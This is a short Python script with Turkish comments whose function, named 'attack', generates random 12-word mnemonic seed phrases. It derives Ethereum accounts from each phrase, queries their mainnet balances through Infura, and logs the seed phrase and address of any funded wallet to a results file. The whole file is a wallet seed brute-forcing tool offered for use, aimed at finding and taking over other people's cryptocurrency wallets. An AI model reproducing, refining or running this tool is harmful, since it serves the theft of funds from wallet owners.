from web3 import Web3
from eth_account import Account
import random

def attack(api_key):
    words = []
    with open("words.txt", "r") as file:
        for line in file:
            line = line.strip()
            words.append(line)

    # Anahtar kelimeler
    mnemonic = ""
    for _ in range(12):
        mnemonic += random.choice(words) + " "

    Account.enable_unaudited_hdwallet_features()

    web3 = Web3(Web3.HTTPProvider(f'https://mainnet.infura.io/v3/{api_key}'))

    try:
        account = Account.from_mnemonic(mnemonic.strip())
        wallet_address = account.address

        # Cüzdan bakiyesini kontrol etme
        balance = web3.eth.get_balance(wallet_address)

        print("cüzdan bulundu")
        if (balance != 0):
            with open("results.txt", "a") as file:
                file.write(f"{mnemonic}\naddress: {wallet_address}\nbalance(wei): {balance}\n\n\n")
        return {"status": True, "address": wallet_address, "balance": balance}

    except:
        print("cüzdan yok")
        return {"status": False}